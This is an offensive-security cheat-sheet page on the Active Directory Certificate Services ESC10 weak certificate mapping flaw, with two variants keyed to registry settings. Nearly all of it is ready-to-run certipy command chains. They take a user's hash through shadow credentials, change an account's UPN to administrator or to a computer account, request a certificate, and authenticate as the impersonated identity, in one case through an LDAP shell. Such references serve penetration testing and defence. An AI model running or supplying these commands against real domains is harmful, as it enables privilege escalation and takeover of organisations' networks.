# Active Directory - Certificate ESC10

## ESC10 – Weak Certificate Mapping - StrongCertificateBindingEnforcement

**Requirements**:

* `StrongCertificateBindingEnforcement` = 0.

**Exploit**:

```ps1
# get user hash with shadowcredentials
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN
certipy account update -username "user@domain.local" -p "password" -user admin -upn administrator -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "hashes" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect with the certificate
certipy auth -pfx 'administrator.pfx' -domain "domain.local" -dc-ip 10.10.10.10
```

## ESC10 – Weak Certificate Mapping - CertificateMappingMethods

**Requirements**:

* `CertificateMappingMethods` = 0x04.

**Exploit**:

```ps1
certipy shadow auto -username "user@domain.local" -p "password" -account admin -dc-ip 10.10.10.10

# change user UPN to computer$
certipy account update -username "user@domain.local" -p "password" -user admin -upn 'computer$@domain.local' -dc-ip 10.10.10.10

# ask for certificate
certipy req -username "admin@domain.local" -hashes "3b60abbc25770511334b3829866b08f1" -target "10.10.10.10" -ca 'DOMAIN-CA' -template 'user' -debug

# Rollback upn modification
certipy account update -username "user@domain.local" -p "password" -user admin -upn admin -dc-ip 10.10.10.10

# Connect via schannel with the certificate 
certipy auth -pfx 'computer.pfx' -domain "domain.local" -dc-ip 10.10.10.10 -ldap-shell
```

## References

* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
